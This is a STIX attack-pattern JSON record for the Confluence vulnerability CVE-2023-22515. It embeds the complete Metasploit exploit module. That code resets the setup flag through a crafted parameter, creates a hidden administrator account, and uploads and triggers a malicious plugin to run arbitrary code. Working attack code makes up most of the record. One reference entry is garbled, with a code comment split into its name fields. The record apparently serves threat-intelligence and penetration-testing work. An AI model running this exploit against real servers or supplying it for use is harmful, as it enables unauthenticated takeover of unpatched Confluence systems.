{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e26b2d26-d250-4714-bebc-e00efa76cddc",
    "created": "2024-08-14T17:08:45.401618Z",
    "modified": "2024-08-14T17:08:45.401622Z",
    "name": "Atlassian Confluence Unauthenticated Remote Code Execution",
    "description": " This module exploits an improper input validation issue in Atlassian Confluence, allowing arbitrary HTTP parameters to be translated into getter/setter sequences via the XWorks2 middleware and in turn allows for Java objects to be modified at run time. The exploit will create a new administrator user and upload a malicious plugins to get arbitrary code execution. All versions of Confluence between 8.0.0 through to 8.3.2 8.4.0 through to 8.4.2, and 8.5.0 through to 8.5.1 are affected.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/atlassian_confluence_rce_cve_2023_22515.rb",
            "external_id": "atlassian_confluence_rce_cve_2023_22515.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-22515"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html"
        },
        {
            "source_name": "#1.LeverageCVE-2023-22515tomodifyaconfigurationsetting",
            "external_id": "allowingustoreachthe/setup/*endpoints."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Retry\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Atlassian Confluence Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits an improper input validation issue in Atlassian Confluence, allowing arbitrary HTTP\n          parameters to be translated into getter/setter sequences via the XWorks2 middleware and in turn allows for\n          Java objects to be modified at run time. The exploit will create a new administrator user and upload a\n          malicious plugins to get arbitrary code execution. All versions of Confluence between 8.0.0 through to 8.3.2,\n          8.4.0 through to 8.4.2, and 8.5.0 through to 8.5.1 are affected.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sfewer-r7', # MSF Exploit & Rapid7 Analysis\n        ],\n        'References' => [\n          ['CVE', '2023-22515'],\n          ['URL', 'https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis'],\n          ['URL', 'https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html'],\n        ],\n        'DisclosureDate' => '2023-10-04',\n        'Privileged' => false, # `NT AUTHORITY\\NETWORK SERVICE` on Windows by default.\n        'Targets' => [\n          [\n            'Automatic',\n            {\n              'Platform' => 'java',\n              'Arch' => [ARCH_JAVA]\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          # Note we cannot delete the admin user we create, as Confluence prevents a user deleting themself.\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        # By default Confluence listens for HTTP requests on TCP port 8090.\n        Opt::RPORT(8090),\n        # Confluence may have a non default base path, allow user to configure that here.\n        OptString.new('TARGETURI', [true, 'Base path for Confluence', '/']),\n        # The endpoint we target to trigger the vulnerability.\n        OptString.new('CONFLUENCE_TARGET_ENDPOINT', [true, 'The endpoint used to trigger the vulnerability.', 'server-info.action']),\n        # We upload a new plugin, we need to wait for the plugin to be installed. This options governs how long we wait.\n        OptInt.new('CONFLUENCE_PLUGIN_TIMEOUT', [true, 'The timeout (in seconds) to wait when installing a plugin', 30])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, datastore['CONFLUENCE_TARGET_ENDPOINT'])\n    )\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    # Ensure target is a Confluence server by identifying an expected HTTP header.\n    return CheckCode::Unknown('No \\'X-Confluence-Request-Time\\' header') unless res.headers.key? 'X-Confluence-Request-Time'\n\n    if res.code == 200 && res.body\n      # Pull out the version string from one of three known locations within the HTML.\n      m = res.body.match(/ajs-version-number\" content=\"(\\d+\\.\\d+\\.\\d+)\"/i)\n      if m.nil?\n        m = res.body.match(/Printed by Atlassian Confluence (\\d+\\.\\d+\\.\\d+)/i)\n        if m.nil?\n          m = res.body.match(%r{<span id='footer-build-information'>(\\d+\\.\\d+\\.\\d+)</span>}i)\n        end\n      end\n\n      unless m.nil?\n        version = Rex::Version.new(m[1])\n\n        ranges = [\n          ['8.0.0', '8.3.2'],\n          ['8.4.0', '8.4.2'],\n          ['8.5.0', '8.5.1']\n        ]\n\n        # If we have a Confluence server within the given version ranges, it appears vulnerable.\n        ranges.each do |min, max|\n          if version.between?(Rex::Version.new(min), Rex::Version.new(max))\n            return Exploit::CheckCode::Appears(\"Atlassian Confluence #{version}\")\n          end\n        end\n\n        # By here we know we have a confluence server, but the version found indicates it is safe.\n        return Exploit::CheckCode::Safe(\"Atlassian Confluence #{version}\")\n      end\n    end\n\n    # By here we have identified a Confluence server, but could not get the version number to determine if it is\n    # vulnerable of not.\n    CheckCode::Detected\n  end\n\n  def exploit\n    target_endpoint = normalize_uri(target_uri.path, datastore['CONFLUENCE_TARGET_ENDPOINT'])\n\n    print_status(\"Setting the application configuration's setupComplete to false via endpoint: #{target_endpoint}\")\n\n    # 1. Leverage CVE-2023-22515 to modify a configuration setting, allowing us to reach the /setup/* endpoints.\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => target_endpoint,\n      'vars_post' => {\n        'bootstrapStatusProvider.applicationConfig.setupComplete' => 'false'\n      }\n    )\n\n    unless res&.code == 302 || res&.code == 200\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply from endpoint: #{target_endpoint}\")\n    end\n\n    print_status('Creating a new administrator user account...')\n\n    # usernames must be lowercase\n    admin_username = rand_text_alpha_lower(8)\n    admin_password = rand_text_alphanumeric(8)\n\n    # 2. Create a new administrator user account.\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'setup', 'setupadministrator.action'),\n      'headers' => {\n        'X-Atlassian-Token' => 'no-check'\n      },\n      'vars_post' => {\n        'username' => admin_username,\n        'fullName' => rand_text_alphanumeric(8),\n        # The email address does not need to be a valid address, but it must contain an @ character.\n        'email' => \"#{rand_text_alphanumeric(8)}@#{rand_text_alphanumeric(8)}\",\n        'password' => admin_password,\n        'confirm' => admin_password,\n        'setup-next-button' => 'Next'\n      }\n    )\n\n    unless res&.code == 302 || res&.code == 200\n      fail_with(Failure::UnexpectedReply, 'Unexpected reply from endpoint: /setup/setupadministrator.action')\n    end\n\n    print_status(\"Created #{admin_username}:#{admin_password}\")\n\n    # 3. Force the setup to become completed, to allow normal Confluence operations to continue.\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'setup', 'finishsetup.action'),\n      'headers' => {\n        'X-Atlassian-Token' => 'no-check'\n      }\n    )\n\n    unless res&.code == 200\n      fail_with(Failure::UnexpectedReply, 'Unexpected reply from endpoint: /setup/finishsetup.action')\n    end\n\n    print_status('Adding a malicious plugin...')\n\n    # 4. Upload a new Confluence Servlet plugin, by first requesting a UPM token.\n    res = send_request_cgi(\n      'method' => 'GET',\n      # Note, we concatenate '/' as this is required by the endpoint.\n      'uri' => normalize_uri(target_uri.path, 'rest', 'plugins', '1.0') + '/',\n      'headers' => {\n        'Authorization' => basic_auth(admin_username, admin_password),\n        'Accept' => '*/*'\n      },\n      'vars_get' => {\n        'os_authType' => 'basic'\n      }\n    )\n\n    unless res&.code == 200\n      fail_with(Failure::UnexpectedReply, 'Unexpected reply from endpoint: /rest/plugins/1.0/')\n    end\n\n    upm_token = res.headers['upm-token']\n    unless upm_token\n      fail_with(Failure::UnexpectedReply, 'No UPM token from endpoint: /rest/plugins/1.0/')\n    end\n\n    begin\n      payload_endpoint = rand_text_alphanumeric(8)\n\n      plugin_key = rand_text_alpha(8)\n\n      # 5. Construct a malicious Servlet plugin JAR file. We set :random to true which will randomize the string\n      # 'metasploit' in the class paths (via Rex::Zip::Jar::add_sub).\n      jar = payload.encoded_jar(random: true)\n\n      jar.add_file(\n        'atlassian-plugin.xml',\n        %(\n<atlassian-plugin name=\"#{rand_text_alpha(8)}\" key=\"#{plugin_key}\" plugins-version=\"2\">\n  <plugin-info>\n    <description>#{rand_text_alphanumeric(8)}</description>\n    <version>#{rand(1024)}.#{rand(1024)}</version>\n  </plugin-info>\n  <servlet key=\"#{rand_text_alpha(8)}\" class=\"#{jar.substitutions['metasploit']}.PayloadServlet\">\n    <url-pattern>#{normalize_uri(payload_endpoint)}</url-pattern>\n  </servlet>\n</atlassian-plugin>)\n      )\n\n      jar.add_file('metasploit/PayloadServlet.class', MetasploitPayloads.read('java', 'metasploit', 'PayloadServlet.class'))\n\n      message = Rex::MIME::Message.new\n\n      message.add_part(jar.pack, 'application/octet-stream', 'binary', \"form-data; name=\\\"plugin\\\"; filename=\\\"#{rand_text_alphanumeric(8)}.jar\\\"\")\n\n      # 6. Upload the malicious plugin.\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'rest', 'plugins', '1.0') + '/',\n        'ctype' => 'multipart/form-data; boundary=' + message.bound,\n        'headers' => {\n          'Authorization' => basic_auth(admin_username, admin_password),\n          'Accept' => '*/*'\n        },\n        'vars_get' => {\n          'token' => upm_token\n        },\n        'data' => message.to_s\n      )\n\n      unless res&.code == 202\n        fail_with(Failure::UnexpectedReply, 'Uploading plugin failed, unexpected reply code from endpoint: /rest/plugins/1.0/')\n      end\n\n      unless res.body =~ %r{<textarea>(.+)</textarea>}\n        fail_with(Failure::UnexpectedReply, 'Uploading plugin failed, unexpected reply data from endpoint: /rest/plugins/1.0/')\n      end\n\n      begin\n        plugin_json = JSON.parse(::Regexp.last_match(1))\n      rescue JSON::ParserError\n        fail_with(Failure::UnexpectedReply, 'Uploading plugin failed, failed to parse JSON data from endpoint: /rest/plugins/1.0/')\n      end\n\n      # We receive a JSON object like this:\n      # <textarea>{\"type\":\"INSTALL\",\"pingAfter\":100,\"status\":{\"done\":false,\"statusCode\":200,\"contentType\":\"application/vnd.atl.plugins.install.installing+json\",\"source\":\"JQEjEJBr.jar\",\"name\":\"JQEjEJBr.jar\"},\"links\":{\"self\":\"/rest/plugins/1.0/pending/52227753-1c3e-496f-a4f4-d52a8b3850dc\",\"alternate\":\"/rest/plugins/1.0/tasks/52227753-1c3e-496f-a4f4-d52a8b3850dc\"},\"timestamp\":1697471602188,\"userKey\":\"4028d6b28b294680018b39311d17001e\",\"id\":\"52227753-1c3e-496f-a4f4-d52a8b3850dc\"}</textarea>\n\n      links_alternate = plugin_json&.dig('links', 'alternate')\n      if links_alternate.nil?\n        fail_with(Failure::UnexpectedReply, 'Uploading plugin failed, no alternate link in reply from endpoint: /rest/plugins/1.0/')\n      end\n\n      print_status('Waiting for plugin to be installed...')\n\n      # 7. The plugin is installed asynchronously, so we poll the server for installation to be completed.\n      plugin_ready = retry_until_truthy(timeout: datastore['CONFLUENCE_PLUGIN_TIMEOUT']) do\n        res = send_request_cgi(\n          'method' => 'GET',\n          'uri' => normalize_uri(target_uri.path, links_alternate)\n        )\n\n        # We receive a JSON result to indicate if the plugin is finished installing.\n        # {\"links\":{\"self\":\"/rest/plugins/1.0/tasks/52227753-1c3e-496f-a4f4-d52a8b3850dc\",\"result\":\"/rest/plugins/1.0/plkWITNH-key\"},\"done\":true,\"type\":\"INSTALL\",\"progress\":1.0,\"pollDelay\":100,\"timestamp\":1697471602188}\n\n        if res&.code == 200\n          begin\n            res_json = JSON.parse(res.body)\n            next res_json['done']\n          rescue JSON::ParserError\n            next false\n          end\n        end\n\n        false\n      end\n\n      unless plugin_ready\n        fail_with(Failure::TimeoutExpired, 'Uploading plugin failed, timeout while waiting to install.')\n      end\n\n      print_status('Triggering payload...')\n\n      # 8. Trigger the payload by performing a request to the malicious servlet endpoint.\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'plugins', 'servlet', payload_endpoint)\n      )\n\n      unless res&.code == 200\n        fail_with(Failure::PayloadFailed, \"Triggering payload failed, unexpected reply from endpoint: /plugins/servlet/#{payload_endpoint}\")\n      end\n    ensure\n      print_status('Deleting plugin...')\n\n      # 9. Delete the plugin we uploaded as we no longer need it. We cannot delete the admin user we created as\n      # Confluence doesnt allow a user to delete themself.\n      res = send_request_cgi(\n        'method' => 'DELETE',\n        'uri' => normalize_uri(target_uri.path, 'rest', 'plugins', '1.0', \"#{plugin_key}-key\"),\n        'headers' => {\n          'Authorization' => basic_auth(admin_username, admin_password),\n          'Connection' => 'close'\n        }\n      )\n\n      unless res&.code == 204\n        print_warning(\"Deleting plugin failed, unexpected reply from endpoint: /plugins/servlet/#{payload_endpoint}\")\n      end\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2023-10-04",
    "x_mitre_platforms": [
        "java'"
    ]
}